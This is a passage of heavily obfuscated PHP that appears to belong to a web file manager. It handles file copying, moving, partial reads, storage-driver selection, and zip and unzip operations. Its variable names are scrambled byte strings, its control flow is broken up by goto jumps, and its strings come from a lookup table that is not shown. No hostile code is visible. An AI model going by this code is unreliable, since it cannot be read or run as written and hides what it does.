$D£½í‡Â¿); } Hook::trigger($DŸÊ‰°ˆ É[1055], $F´•ßÍêŠŠ, $EÓ»Ùîâ‘ê, $D°†•³‰–Ÿ, $D£½í‡Â¿, $Aá˜Ò‹Ñ‰ğ, $dö…Ø­å¦¿); self::copyMoveKeepInfo($F´•ßÍêŠŠ, $EÓ»Ùîâ‘ê, $dö…Ø­å¦¿); return $dö…Ø­å¦¿; } $eÊ™§ Ñæğ = TEMP_FILES; goto cÄÄ™òÊ…; b£•ã·ÜÑ: $DŸÊ‰°ˆ É =& $_SERVER[«¾°Ã¤]; $D£½í‡Â¿ = $D°†•³‰–Ÿ->getPath(rtrim($D£½í‡Â¿, $DŸÊ‰°ˆ É[8]) . $DŸÊ‰°ˆ É[8] . $Aá˜Ò‹Ñ‰ğ); $eğ¨Û——“ƒ = $DŸÊ‰°ˆ É[1053] . time() . rand_string(5); goto D¯Ğõ“…˜Æ; cÄÄ™òÊ…: if ($GLOBALS[$DŸÊ‰°ˆ É[6]][$DŸÊ‰°ˆ É[88]][$DŸÊ‰°ˆ É[769]]) { $eÊ™§ Ñæğ = $GLOBALS[$DŸÊ‰°ˆ É[6]][$DŸÊ‰°ˆ É[88]][$DŸÊ‰°ˆ É[769]]; } $c÷Ç¶“Ìˆæ = !0; $d…“ÛÆÒ¾ = $eÊ™§ Ñæğ; goto E¿‰ŸÏÅäÛ; E¿‰ŸÏÅäÛ: mk_dir($d…“ÛÆÒ¾); $fĞšËÂï·˜ = $d…“ÛÆÒ¾ . $eğ¨Û——“ƒ; $fòà¸ºğì× = $fĞšËÂï·˜; goto F–‹Ë¿¨; dŒšêÆ†ÕÉ: } private static function copyMoveKeepInfo($AØ…ˆ¨›¾†, $bÒ‰»ƒÜ÷›, $d™¹¨Ä…íù) { if (!$d™¹¨Ä…íù) { return; } $bö‚ª¹Ê“¸ = $AØ…ˆ¨›¾†->info($bÒ‰»ƒÜ÷›); if (!is_array($bö‚ª¹Ê“¸)) { return; } IO::setModifyTime($d™¹¨Ä…íù, $bö‚ª¹Ê“¸[$_SERVER[«¾°Ã¤][84]]); } public static function pathFather($aÎêá¾÷Õ) { $c®Ú½âÍ´  = IO::init($aÎêá¾÷Õ); $A·ØŒ‘¦¬¼ = $c®Ú½âÍ´ ->pathFather($c®Ú½âÍ´ ->path); return $c®Ú½âÍ´ ->getPathOuter($A·ØŒ‘¦¬¼); } public static function fileOut($DÖÒÚïˆ„», $fïÄˆŒ²›† = false, $f¾Ö™ÆŠ‚» = false, $dİÌˆ×ï©“ = '') { $fî„›ºéØ = self::driverMake($DÖÒÚïˆ„»); if ($fî„›ºéØ->isFileOutServer()) { return $fî„›ºéØ->fileOutServer($DÖÒÚïˆ„», $fïÄˆŒ²›†, $f¾Ö™ÆŠ‚», $dİÌˆ×ï©“); } return $fî„›ºéØ->fileOut($DÖÒÚïˆ„», $fïÄˆŒ²›†, $f¾Ö™ÆŠ‚», $dİÌˆ×ï©“); } public static function fileOutImage($d¤İª½áš, $c¿…œ­†ä = 250) { $B…ÅÑ‡’¢í = array(250, 600, 1200, 3000, 5000); for ($f ¯Ë‘’¾· = 0; $f ¯Ë‘’¾· < count($B…ÅÑ‡’¢í); $f ¯Ë‘’¾·++) { if ($f ¯Ë‘’¾· == 0 && $c¿…œ­†ä <= $B…ÅÑ‡’¢í[$f ¯Ë‘’¾·]) { $c¿…œ­†ä = $B…ÅÑ‡’¢í[$f ¯Ë‘’¾·]; break; } else { if ($c¿…œ­†ä > $B…ÅÑ‡’¢í[$f ¯Ë‘’¾· - 1] && $c¿…œ­†ä <= $B…ÅÑ‡’¢í[$f ¯Ë‘’¾·]) { $c¿…œ­†ä = $B…ÅÑ‡’¢í[$f ¯Ë‘’¾·]; break; } else { if ($f ¯Ë‘’¾· == count($B…ÅÑ‡’¢í) - 1 && $c¿…œ­†ä > $B…ÅÑ‡’¢í[$f ¯Ë‘’¾·]) { $c¿…œ­†ä = $B…ÅÑ‡’¢í[$f ¯Ë‘’¾·]; break; } } } } $B¬¿­·×§Í = self::driverMake($d¤İª½áš); if ($B¬¿­·×§Í->isFileOutServer()) { return $B¬¿­·×§Í->fileOutImageServer($d¤İª½áš, $c¿…œ­†ä); } return $B¬¿­·×§Í->fileOutImage($d¤İª½áš, $c¿…œ­†ä); } private static function driverIsSame($bšñ©±Ì«å, $a³ØÒåËš°) { goto F¡ˆéÙó™; AòÌ£ìŞ¿İ: if ($fÄƒ¡…Œó != $c˜šÛŒº¬) { return !1; } if ($fÄƒ¡…Œó == $eĞÇ£Êù×[727]) { return !0; } if ($fÄƒ¡…Œó == $eĞÇ£Êù×[106]) { return !0; } goto Açø«¢Åóç; F¡ˆéÙó™: $eĞÇ£Êù× =& $_SERVER[«¾°Ã¤]; $fÄƒ¡…Œó = $bšñ©±Ì«å->getType(); $c˜šÛŒº¬ = $a³ØÒåËš°->getType(); goto AòÌ£ìŞ¿İ; Açø«¢Åóç: if ($bšñ©±Ì«å->pathDriver == $a³ØÒåËš°->pathDriver) { return !0; } return !1; goto EÕç³Õ—ãœ; EÕç³Õ—ãœ: } public static function copyUpdate($B„ê†İÓø¥, $bõğ—ö™Şí) { goto bŒš³ÊñŸ—; C¶é÷¥ªâÃ: $eªø–Ú®›© = self::_listAll($B„ê†İÓø¥); $Cä¡Åî‰ñª = self::_listAll($bõğ—ö™Şí); $dõ¿Ùåˆ”Å = array(); goto aìŸ‚Œš·´; bŒš³ÊñŸ—: $FñÙÓšæêŠ =& $_SERVER[«¾°Ã¤]; if (!IO::exist($B„ê†İÓø¥)) { return !1; } if (!IO::exist($bõğ—ö™Şí)) { IO::mkdir($bõğ—ö™Şí); } goto C¶é÷¥ªâÃ; FÖÜ‰ÀÀÖÈ: Hook::trigger($FñÙÓšæêŠ[1059], $B„ê†İÓø¥, $bõğ—ö™Şí, $CÒç×áÖ—”); foreach ($E³¡ñ»’™ as $cİÙÁÄ³¥¯) { IO::mkdir($cİÙÁÄ³¥¯); } foreach ($dõ¿Ùåˆ”Å as $cİÙÁÄ³¥¯) { IO::copy($cİÙÁÄ³¥¯[$FñÙÓšæêŠ[1056]], $cİÙÁÄ³¥¯[$FñÙÓšæêŠ[1057]], REPEAT_REPLACE); } goto e‚ÖÌŠÉ¦ª; aìŸ‚Œš·´: $E³¡ñ»’™ = array(); foreach ($eªø–Ú®›© as $aß¤£ÕùÒ¨ => $cİÙÁÄ³¥¯) { if (isset($Cä¡Åî‰ñª[$aß¤£ÕùÒ¨])) { if ($cİÙÁÄ³¥¯[$FñÙÓšæêŠ[77]] == 1) { continue; } if ($Cä¡Åî‰ñª[$aß¤£ÕùÒ¨][$FñÙÓšæêŠ[78]] == $cİÙÁÄ³¥¯[$FñÙÓšæêŠ[78]]) { continue; } } if ($cİÙÁÄ³¥¯[$FñÙÓšæêŠ[77]] == 1) { $E³¡ñ»’™[] = $bõğ—ö™Şí . $FñÙÓšæêŠ[8] . $aß¤£ÕùÒ¨; continue; } $Dµ¼ˆ•° = strstr(trim($aß¤£ÕùÒ¨, $FñÙÓšæêŠ[8]), $FñÙÓšæêŠ[8]) ? get_path_father($aß¤£ÕùÒ¨) : $FñÙÓšæêŠ[33]; $dõ¿Ùåˆ”Å[] = array($FñÙÓšæêŠ[1056] => $cİÙÁÄ³¥¯[$FñÙÓšæêŠ[76]], $FñÙÓšæêŠ[1057] => rtrim($bõğ—ö™Şí, $FñÙÓšæêŠ[8]) . $FñÙÓšæêŠ[8] . $Dµ¼ˆ•°, $FñÙÓšæêŠ[1058] => $cİÙÁÄ³¥¯); } $CÒç×áÖ—” = array($FñÙÓšæêŠ[193] => $dõ¿Ùåˆ”Å, $FñÙÓšæêŠ[77] => $E³¡ñ»’™); goto FÖÜ‰ÀÀÖÈ; e‚ÖÌŠÉ¦ª: } private static function _listAll($C‚»²®å±) { $bÂ‡“©¬Øœ =& $_SERVER[«¾°Ã¤]; $C‚»²®å± = KodIO::clear($C‚»²®å±); $fš¼†æ¸â = IO::listAll($C‚»²®å±); foreach ($fš¼†æ¸â as &$cöÅ†ø¤¥¤) { $Fº…„öĞØ» = substr($cöÅ†ø¤¥¤[$bÂ‡“©¬Øœ[76]], strlen($C‚»²®å±)); $cöÅ†ø¤¥¤[$bÂ‡“©¬Øœ[1060]] = trim($Fº…„öĞØ», $bÂ‡“©¬Øœ[8]); } unset($cöÅ†ø¤¥¤); return array_to_keyvalue($fš¼†æ¸â, $bÂ‡“©¬Øœ[1060]); } public static function fileSubstr($e­ÚéŠ¥›ñ, $F§å®î”­ã, $fàİ§ÚğØš = false) { goto b²Ô‚… ›ë; f—å­íšÜš: $EÓ‚‘ÄÁˆš = $F§å®î”­ã; $D¥™ÑÇ ¹Ÿ = $fàİ§ÚğØš; if ($F§å®î”­ã < 0) { $F§å®î”­ã = $c‘óôáµº¹ + $F§å®î”­ã; } goto c¿Ìµöåí÷; b²Ô‚… ›ë: $FÕÎ¢Çø¯÷ =& $_SERVER[«¾°Ã¤]; $fµïàÉ„´ = self::driverMake($e­ÚéŠ¥›ñ); $c‘óôáµº¹ = $fµïàÉ„´->size($e­ÚéŠ¥›ñ); goto f—å­íšÜš; D·¸ØÁÊªä: if ($fàİ§ÚğØš <= 0) { return $FÕÎ¢Çø¯÷[33]; } if ($F§å®î”­ã < 0 || $F§å®î”­ã >= $c‘óôáµº¹ || $fàİ§ÚğØš > 1024 * 1024 * 5) { throw new Exception("\146\151\x6c\x65\122\x65\141\144\x20\145\162\x72\x6f\162\41\x20\x73\x74\x61\x72\x74\x3d{$F§å®î”­ã}\73\x6c\x65\x6e\x67\x74\x68\x3d{$fàİ§ÚğØš}\x3b\x20\x73\x69\172\x65\75{$c‘óôáµº¹}\x3b"); } $Aæ…”½º¬Ñ = $fµïàÉ„´->fileSubstr($e­ÚéŠ¥›ñ, $F§å®î”­ã, $fàİ§ÚğØš); goto eŠÎØèô¸“; c¿Ìµöåí÷: if ($fàİ§ÚğØš === !1) { $fàİ§ÚğØš = $c‘óôáµº¹ - $F§å®î”­ã; } if ($F§å®î”­ã + $fàİ§ÚğØš > $c‘óôáµº¹) { $fàİ§ÚğØš = $c‘óôáµº¹ - $F§å®î”­ã; } if (!$c‘óôáµº¹ && $fµïàÉ„´->getType() == $FÕÎ¢Çø¯÷[106] && !$fµïàÉ„´->exist($e­ÚéŠ¥›ñ)) { throw new Exception($FÕÎ¢Çø¯÷[1061] . LNG($FÕÎ¢Çø¯÷[1062]) . $FÕÎ¢Çø¯÷[925] . get_path_this($e­ÚéŠ¥›ñ) . $FÕÎ¢Çø¯÷[33]); } goto D·¸ØÁÊªä; eŠÎØèô¸“: if (!$Aæ…”½º¬Ñ && $fàİ§ÚğØš && isset($GLOBALS[$FÕÎ¢Çø¯÷[1063]])) { throw new Exception($GLOBALS[$FÕÎ¢Çø¯÷[1063]][$FÕÎ¢Çø¯÷[1064]]); } return $Aæ…”½º¬Ñ; goto fÜ×äÉ‹ª; fÜ×äÉ‹ª: } private static function driverMake(&$Aé ·‡¡²) { goto bŞÛÆÇŠ³; bŞÛÆÇŠ³: $AõÛ‘ŞÉ¡ =& $_SERVER[«¾°Ã¤]; $Aè³†Üº•¿ = KodIO::parse($Aé ·‡¡²); if (!self::$driverListSystem) { $E¦¢Æğéğ… = Model($AõÛ‘ŞÉ¡[736])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($E¦¢Æğéğ…, $AõÛ‘ŞÉ¡[393]); } goto cØ©‚ƒÏñ; fÆÏÕÉ¾ñÜ: return $bŸ£Ú…öâÆ; goto aî”…’Ô‚ˆ; cØ©‚ƒÏñ: if ($Aè³†Üº•¿[$AõÛ‘ŞÉ¡[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Aè³†Üº•¿[$AõÛ‘ŞÉ¡[393]]]) { return !1; } $Aé ·‡¡² = $Aè³†Üº•¿[$AõÛ‘ŞÉ¡[1065]]; $bŸ£Ú…öâÆ = self::driverGet($Aè³†Üº•¿, $Aé ·‡¡²); goto fÆÏÕÉ¾ñÜ; aî”…’Ô‚ˆ: } private static function driverGet($døò“ĞŒ‡, &$D’º†ÕÊ‘) { goto DèïŸ…¯İÉ; DèïŸ…¯İÉ: $Bô¾£ºÓÖÛ =& $_SERVER[«¾°Ã¤]; $B„ãíÂ±ß‡ = $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[1066]]; $eÙ®×ËÍ½² = $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[393]]; goto BñÅ³ô‰Î; FÂ›ÙÛÖ­¾: if (isset($aªˆ” ³‰¨[$Bô¾£ºÓÖÛ[6]][$Bô¾£ºÓÖÛ[1077]])) { $EÔ¡††ÓÈì->pathBase = rtrim($aªˆ” ³‰¨[$Bô¾£ºÓÖÛ[6]][$Bô¾£ºÓÖÛ[1077]], $Bô¾£ºÓÖÛ[8]) . $Bô¾£ºÓÖÛ[8]; $D’º†ÕÊ‘ = $EÔ¡††ÓÈì->pathBase . ltrim($D’º†ÕÊ‘, $Bô¾£ºÓÖÛ[8]); } $D’º†ÕÊ‘ = $EÔ¡††ÓÈì->getPath($D’º†ÕÊ‘); if (isset($døò“ĞŒ‡[$Bô¾£ºÓÖÛ[1049]])) { $D’º†ÕÊ‘ = $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[1049]]; } goto cà¼ò¡öøæ; có²å¦Ôâš: $EÔ¡††ÓÈì = self::$driverCache[$dÚóñ„òÉ¥]; $EÔ¡††ÓÈì->pathDriver = $B„ãíÂ±ß‡; $EÔ¡††ÓÈì->pathBase = $Bô¾£ºÓÖÛ[33]; goto FÂ›ÙÛÖ­¾; cà¼ò¡öøæ: $EÔ¡††ÓÈì->path = $D’º†ÕÊ‘; return $EÔ¡††ÓÈì; goto Dœ´°Üàí; BñÅ³ô‰Î: switch ($døò“ĞŒ‡[$Bô¾£ºÓÖÛ[29]]) { case KodIO::KOD_IO: $aªˆ” ³‰¨ = self::$driverListSystem[$eÙ®×ËÍ½²]; break; case KodIO::KOD_SOURCE: $D’º†ÕÊ‘ = $eÙ®×ËÍ½² . $D’º†ÕÊ‘; $aªˆ” ³‰¨ = array($Bô¾£ºÓÖÛ[1067] => $Bô¾£ºÓÖÛ[1068], $Bô¾£ºÓÖÛ[6] => $døò“ĞŒ‡); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $c”±•‚ê¥ = $GLOBALS[$Bô¾£ºÓÖÛ[1069]]; self::$driverListUser = array_to_keyvalue($c”±•‚ê¥, $Bô¾£ºÓÖÛ[393]); } $aªˆ” ³‰¨ = self::$driverListUser[$eÙ®×ËÍ½²]; break; case KodIO::KOD_SHARE_LINK: $aªˆ” ³‰¨ = array($Bô¾£ºÓÖÛ[1067] => $Bô¾£ºÓÖÛ[1070], $Bô¾£ºÓÖÛ[6] => $døò“ĞŒ‡); $b‘±‘µ—½ = Action($Bô¾£ºÓÖÛ[1071])->sharePathInfo($døò“ĞŒ‡[$Bô¾£ºÓÖÛ[76]]); $D’º†ÕÊ‘ = $b‘±‘µ—½[$Bô¾£ºÓÖÛ[404]]; if (!$b‘±‘µ—½[$Bô¾£ºÓÖÛ[404]]) { $A Ø–£ÇÉŠ = Model($Bô¾£ºÓÖÛ[572])->getInfo($b‘±‘µ—½[$Bô¾£ºÓÖÛ[477]]); $D’º†ÕÊ‘ = KodIO::clear($A Ø–£ÇÉŠ[$Bô¾£ºÓÖÛ[1072]] . $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[1065]]); $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[475]] = $A Ø–£ÇÉŠ; $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[1049]] = $D’º†ÕÊ‘; $aªˆ” ³‰¨ = array($Bô¾£ºÓÖÛ[1067] => $Bô¾£ºÓÖÛ[1073], $Bô¾£ºÓÖÛ[6] => $døò“ĞŒ‡); } break; case KodIO::KOD_SHARE_ITEM: $aªˆ” ³‰¨ = array($Bô¾£ºÓÖÛ[1067] => $Bô¾£ºÓÖÛ[1074], $Bô¾£ºÓÖÛ[6] => $døò“ĞŒ‡); $A Ø–£ÇÉŠ = Model($Bô¾£ºÓÖÛ[572])->getInfo($døò“ĞŒ‡[$Bô¾£ºÓÖÛ[393]]); if ($A Ø–£ÇÉŠ[$Bô¾£ºÓÖÛ[404]] == $Bô¾£ºÓÖÛ[191]) { $D’º†ÕÊ‘ = KodIO::clear($A Ø–£ÇÉŠ[$Bô¾£ºÓÖÛ[1072]] . $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[1065]]); $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[475]] = $A Ø–£ÇÉŠ; $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[1049]] = $D’º†ÕÊ‘; $aªˆ” ³‰¨ = array($Bô¾£ºÓÖÛ[1067] => $Bô¾£ºÓÖÛ[1075], $Bô¾£ºÓÖÛ[6] => $døò“ĞŒ‡); } else { if (!$D’º†ÕÊ‘) { $D’º†ÕÊ‘ = $A Ø–£ÇÉŠ[$Bô¾£ºÓÖÛ[404]]; } } break; default: $D’º†ÕÊ‘ = $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[76]]; $aªˆ” ³‰¨ = array($Bô¾£ºÓÖÛ[1067] => $Bô¾£ºÓÖÛ[1076]); break; } $dÚóñ„òÉ¥ = $døò“ĞŒ‡[$Bô¾£ºÓÖÛ[76]]; if (!isset(self::$driverCache[$dÚóñ„òÉ¥])) { $b­÷ˆÂ¦† = strtolower($aªˆ” ³‰¨[$Bô¾£ºÓÖÛ[94]]); $AŞ‚ÛÜåé = $GLOBALS[$Bô¾£ºÓÖÛ[6]][$Bô¾£ºÓÖÛ[88]][$Bô¾£ºÓÖÛ[800]]; $CØ®™ÏÏ²” = $Bô¾£ºÓÖÛ[72] . (isset($AŞ‚ÛÜåé[$b­÷ˆÂ¦†]) ? $AŞ‚ÛÜåé[$b­÷ˆÂ¦†] : ucfirst($b­÷ˆÂ¦†)); if (!class_exists($CØ®™ÏÏ²”)) { show_json("{$CØ®™ÏÏ²”}\40\x6e\x6f\x74\40\x65\x78\x69\163\x74\163\x21", !1); } $bÉÊ÷‘ğ ¡ = isset($aªˆ” ³‰¨[$Bô¾£ºÓÖÛ[6]]) ? $aªˆ” ³‰¨[$Bô¾£ºÓÖÛ[6]] : !1; self::$driverCache[$dÚóñ„òÉ¥] = new $CØ®™ÏÏ²”($bÉÊ÷‘ğ ¡); } goto có²å¦Ôâš; Dœ´°Üàí: } public static function errorTips($FùÜ‡…ô¦¸ = false) { goto FáÀÒ½´…Æ; c†Š•í«µ×: if ($FùÜ‡…ô¦¸ === -1) { return $aÇ¯¥³åØ” ? $aÇ¯¥³åØ”[count($aÇ¯¥³åØ”) - 1] : $fˆ’°áŞ°÷[33]; } if ($FùÜ‡…ô¦¸ === !1) { return implode($fˆ’°áŞ°÷[229], $aÇ¯¥³åØ”); } if (count($aÇ¯¥³åØ”) >= $Eõº“Êîñ¤) { $aÇ¯¥³åØ” = array_slice($aÇ¯¥³åØ”, $Eõº“Êîñ¤ * 0.5, $Eõº“Êîñ¤); } goto aÈõˆ³’­; FáÀÒ½´…Æ: $fˆ’°áŞ°÷ =& $_SERVER[«¾°Ã¤]; static $aÇ¯¥³åØ” = array(); $Eõº“Êîñ¤ = 1000; goto c†Š•í«µ×; aÈõˆ³’­: $aÇ¯¥³åØ”[] = $FùÜ‡…ô¦¸; write_log($fˆ’°áŞ°÷[160] . ACTION . $fˆ’°áŞ°÷[1078] . $FùÜ‡…ô¦¸, $fˆ’°áŞ°÷[1079]); goto EÕ­ÉÆ¬ƒ; EÕ­ÉÆ¬ƒ: } public static function getLastError($e¨„‰³Âö‰ = '') { $BÏˆÎŒ½Ÿ« = self::errorTips(-1); return $BÏˆÎŒ½Ÿ« ? $BÏˆÎŒ½Ÿ« : $e¨„‰³Âö‰; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $FÕîàØ©Í˜; if (!$FÕîàØ©Í˜) { $fîˆ¬ö›‚É = IO::init($_SERVER[«¾°Ã¤][8]); } return $fîˆ¬ö›‚É; } private static function iconvSystem($e¸µ…Á¥„â) { return self::local()->iconvSystem($e¸µ…Á¥„â); } private static function iconvApp($Bã¬¼È‘Éâ) { return self::local()->iconvApp($Bã¬¼È‘Éâ); } public static function zip($fàÎ¬Ç«ËÁ, $Cñ»ãæâ£¦ = "\x7a\151\x70", $B™å÷Î³‡ = '', $aè¼ÂÀ‘ŒË = REPEAT_RENAME) { goto F‚§Ç×ÆÇ½; cÂêå¦¼µ—: if ($B™å÷Î³‡ || !$D¦õ™›¼¢Á) { if ($D¦õ™›¼¢Á && strstr($D¦õ™›¼¢Á, TEMP_FILES)) { $bÃáíé¿†à = $BùòÈñî³Ø = array(); recursion_dir($F¬Ç«ßñàÇ, $bÃáíé¿†à, $BùòÈñî³Ø, 0); foreach ($bÃáíé¿†à as $c·Ö‡Ç®šÉ) { del_dir($c·Ö‡Ç®šÉ); } foreach ($BùòÈñî³Ø as $aˆÏê¢½Ã½) { if ($aˆÏê¢½Ã½ == $B´ÄÊµ‚Å) { continue; } del_file($aˆÏê¢½Ã½); } } return $BßÄ…Çì¾õ; } $b‡õ÷ÇØ³ª = self::pathFather($FÕÒ’–ô“ï[$cŠÇË»¬Ü[76]]); $CŞĞî‚¸Ğè = self::move($BßÄ…Çì¾õ, $b‡õ÷ÇØ³ª, $aè¼ÂÀ‘ŒË); goto A¿æÏÔœí¿; aÛíÍ†«í’: if (count($BùòÈñî³Ø) > 1) { $c‚Ò¢›Ûª­ = IO::info(IO::pathFather($FÕÒ’–ô“ï[$cŠÇË»¬Ü[76]])); $CÍ‰¨èÄÎæ = $c‚Ò¢›Ûª­[$cŠÇË»¬Ü[28]]; } $F¬Ç«ßñàÇ = $D¦õ™›¼¢Á; if (!$F¬Ç«ßñàÇ) { $F¬Ç«ßñàÇ = get_path_father($FÕÒ’–ô“ï[$cŠÇË»¬Ü[76]]); if (!$B™å÷Î³‡ && $aÇ­Ú’øğÊ->getType() == $cŠÇË»¬Ü[106]) { $F¬Ç«ßñàÇ = get_path_father($aÇ­Ú’øğÊ->path); } $F˜Éô÷À–ä = IO::info($F¬Ç«ßñàÇ); if (!$F˜Éô÷À–ä[$cŠÇË»¬Ü[196]]) { show_json(LNG($cŠÇË»¬Ü[1081]), !1); } } goto DÑÃåÇò˜ò; F‚§Ç×ÆÇ½: $cŠÇË»¬Ü =& $_SERVER[«¾°Ã¤]; $aÇ­Ú’øğÊ = self::init($fàÎ¬Ç«ËÁ[0][$cŠÇË»¬Ü[76]]); $FÕÒ’–ô“ï = self::info($fàÎ¬Ç«ËÁ[0][$cŠÇË»¬Ü[76]]); goto D¦ëóãÀÎ…; D¦ëóãÀÎ…: $D¦õ™›¼¢Á = !1; if (!$B™å÷Î³‡ && $aÇ­Ú’øğÊ->getType() == $cŠÇË»¬Ü[106]) { $BùòÈñî³Ø = self::zipFileList($fàÎ¬Ç«ËÁ); } else { $D¦õ™›¼¢Á = $B™å÷Î³‡ ? $B™å÷Î³‡ : TEMP_FILES . $cŠÇË»¬Ü[1080] . time() . rand_string(8) . $cŠÇË»¬Ü[8]; mk_dir($D¦õ™›¼¢Á); $BùòÈñî³Ø = self::zipFileList($fàÎ¬Ç«ËÁ, $D¦õ™›¼¢Á); } $CÍ‰¨èÄÎæ = $FÕÒ’–ô“ï[$cŠÇË»¬Ü[28]]; goto aÛíÍ†«í’; DÑÃåÇò˜ò: $BßÄ…Çì¾õ = $F¬Ç«ßñàÇ . $CÍ‰¨èÄÎæ . $cŠÇË»¬Ü[95] . $Cñ»ãæâ£¦; $BßÄ…Çì¾õ = get_filename_auto($BßÄ…Çì¾õ, $cŠÇË»¬Ü[33], $aè¼ÂÀ‘ŒË); $B´ÄÊµ‚Å = self::iconvSystem($BßÄ…Çì¾õ); goto a˜Öß–·‡Ç; A¿æÏÔœí¿: if (!$CŞĞî‚¸Ğè) { del_dir($D¦õ™›¼¢Á); show_json(LNG($cŠÇË»¬Ü[1082]), !1); } del_dir($D¦õ™›¼¢Á); return $CŞĞî‚¸Ğè; goto DÓ²áõÄœÄ; a˜Öß–·‡Ç: foreach ($BùòÈñî³Ø as $B³×Ìò£Úò => $b‹Ã×ÆÍÕ) { $BùòÈñî³Ø[$B³×Ìò£Úò] = self::iconvSystem($b‹Ã×ÆÍÕ); } KodArchive::create($B´ÄÊµ‚Å, $BùòÈñî³Ø); if (!IO::exist($BßÄ…Çì¾õ)) { if ($D¦õ™›¼¢Á) { del_dir($D¦õ™›¼¢Á); } show_json(LNG($cŠÇË»¬Ü[1082]), !1); } goto cÂêå¦¼µ—; DÓ²áõÄœÄ: } public static function unzip($EáÎ‰šÛ›¯, $e“¨‘º¿ÏĞ = "\162\x65\x70\154\x61\143\145") { goto Béì¬œß‡; CŸê—öß‡‹: foreach ($fäé×‘§¤— as $bÌ´Åµ‡‰) { $bÌ´Åµ‡‰ = self::iconvApp($bÌ´Åµ‡‰); self::move($bÌ´Åµ‡‰, $bÔêÇ”¸—æ, $e“¨‘º¿ÏĞ); } del_dir($AêŞ¤ê—¥ö); if (!$c¹óİË‘äº) { del_file($FêÏµ²°á‡); } goto f‹²Šô†Ë¼; bÖ°Ã¡øÁ: $dœéÙ›áã = KodArchive::extract($FêÏµ²°á‡, $AêŞ¤ê—¥ö . $B‰†•´øšÓ[8], $Eò»šœ¡Äî); self::archiveExt(); if (!$dœéÙ›áã[$B‰†•´øšÓ[1087]]) { show_json($B‰†•´øšÓ[1088] . $dœéÙ›áã[$B‰†•´øšÓ[1089]], !1); } goto f®‰ÃĞÕˆö; Béì¬œß‡: $B‰†•´øšÓ =& $_SERVER[«¾°Ã¤]; $b´±“Å³ÈÜ = $EáÎ‰šÛ›¯[$B‰†•´øšÓ[76]]; $bÔêÇ”¸—æ = $EáÎ‰šÛ›¯[$B‰†•´øšÓ[1083]]; goto EÇ†²Ø°; fãÊ‘“¹’²: mk_dir($AêŞ¤ê—¥ö); $d”äí©Â® = self::fileExt($D‹—øªÚÜ¡); $FêÏµ²°á‡ = $AêŞ¤ê—¥ö . $B‰†•´øšÓ[95] . $d”äí©Â®; goto fö„ô†¸; Bå½ìÊßÔ: $aŠ’ß‰îª = self::tmpFileName($D‹—øªÚÜ¡); $AêŞ¤ê—¥ö = TEMP_FILES . $aŠ’ß‰îª; del_dir($AêŞ¤ê—¥ö); goto fãÊ‘“¹’²; f‹²Šô†Ë¼: return !0; goto aå ´ÀÒÄã; fö„ô†¸: if (!@file_exists(self::iconvSystem($FêÏµ²°á‡))) { $c¹óİË‘äº = self::localFilePath($b´±“Å³ÈÜ, $d”äí©Â®); $FêÏµ²°á‡ = $c¹óİË‘äº ? $c¹óİË‘äº : parent::download($b´±“Å³ÈÜ, $FêÏµ²°á‡); } $FêÏµ²°á‡ = self::iconvSystem($FêÏµ²°á‡); $Eò»šœ¡Äî = isset($EáÎ‰šÛ›¯[$B‰†•´øšÓ[1085]]) ? $EáÎ‰šÛ›¯[$B‰†•´øšÓ[1085]] : $B‰†•´øšÓ[1086]; goto bÖ°Ã¡øÁ; EÇ†²Ø°: if (!($D‹—øªÚÜ¡ = parent::info($b´±“Å³ÈÜ))) { show_json(LNG($B‰†•´øšÓ[1084]), !1); } if (!($eÆó…Õ†ˆî = parent::infoFull($bÔêÇ”¸—æ))) { $bÔêÇ”¸—æ = parent::mkdir($bÔêÇ”¸—æ); $eÆó…Õ†ˆî = array($B‰†•´øšÓ[76] => $bÔêÇ”¸—æ); } else { if (isset($eÆó…Õ†ˆî[$B‰†•´øšÓ[404]]) && trim($eÆó…Õ†ˆî[$B‰†•´øšÓ[76]], $B‰†•´øšÓ[8]) != trim($bÔêÇ”¸—æ, $B‰†•´øšÓ[8])) { $fƒ´ÕƒÔá´ = KodIO::make($eÆó…Õ†ˆî[$B‰†•´øšÓ[487]]); $CÔé–äŸ = parent::fileNameAuto($fƒ´ÕƒÔá´, $eÆó…Õ†ˆî[$B‰†•´øšÓ[28]], REPEAT_RENAME_FOLDER, !0); $bÔêÇ”¸—æ = parent::mkdir($fƒ´ÕƒÔá´ . $CÔé–äŸ); $eÆó…Õ†ˆî = array($B‰†•´øšÓ[76] => $bÔêÇ”¸—æ); } } $bÔêÇ”¸—æ = $eÆó…Õ†ˆî[$B‰†•´øšÓ[76]]; goto Bå½ìÊßÔ; f®‰ÃĞÕˆö: Hook::trigger($B‰†•´øšÓ[1090], $AêŞ¤ê—¥ö); recursion_dir($AêŞ¤ê—¥ö, $E¦Ô‰§¤°Œ, $CöÒéŠÀŠ, 0); $fäé×‘§¤— = array_merge($E¦Ô‰§¤°Œ, $CöÒéŠÀŠ); goto CŸê—öß‡‹; aå ´ÀÒÄã: } public static function unzipList($eœƒ¡òµˆ¹) { goto E¢Ô‹ƒ±ˆ‰; f³‹‘‹¿¯ƒ: $eŒË‰ñÇÕÔ = self::info($fÛéÒ²ÎĞ); $díÈš—î = self::fileExt($eŒË‰ñÇÕÔ); $b­–ÑÕ« ® = self::tmpFileName($eŒË‰ñÇÕÔ); goto C¨“â½ÅŠ; cÏÏğ¿ê×é: $a‡¿’Ú®£“ = self::iconvSystem($a‡¿’Ú®£“); if ($C–†©İ°¿‹ >= 0) { $E²˜Ì‘º = isset($eœƒ¡òµˆ¹[$C×ˆ¬öœ³Ö[1095]]) ? $eœƒ¡òµˆ¹[$C×ˆ¬öœ³Ö[1095]] : !1; $dšƒÈ¿’É÷ = isset($eœƒ¡òµˆ¹[$C×ˆ¬öœ³Ö[28]]) ? $eœƒ¡òµˆ¹[$C×ˆ¬öœ³Ö[28]] : $C×ˆ¬öœ³Ö[33]; KodArchive::filePreview($a‡¿’Ú®£“, 